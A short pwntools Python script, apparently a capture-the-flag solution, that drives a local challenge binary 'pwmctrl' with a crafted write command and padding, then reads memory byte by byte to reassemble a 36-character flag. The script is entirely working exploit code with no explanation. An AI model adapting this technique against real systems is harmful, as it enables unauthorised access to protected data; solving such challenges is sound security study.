from pwn import *
#context.log_level='debug'
p=process("pwmctrl")
p.recvuntil(">")
pld="w \x54 63 2 "+"0 "*61+"7"
p.sendline(pld)
p.sendline("r \x54 64")
p.sendline("w 1 1 17")
sleep(0.5)
p.recv()
p.sendline("w 4 1 17")
sleep(0.5)
p.recv()
p.sendline("w 7 1 17")
sleep(0.5)
p.recv()
p.sendline("w 9 1 17")
sleep(0.5)
p.recv()
flag=''
for i in range(0x24):
    p.sendline('r '+chr(i+0x30)+' 1')
    sleep(0.2)
    res=p.recv().decode()
    #print(list(res))
    c=chr(int('0x'+res.split('\n')[1],16))
    flag+=c
print(flag)
p.interactive()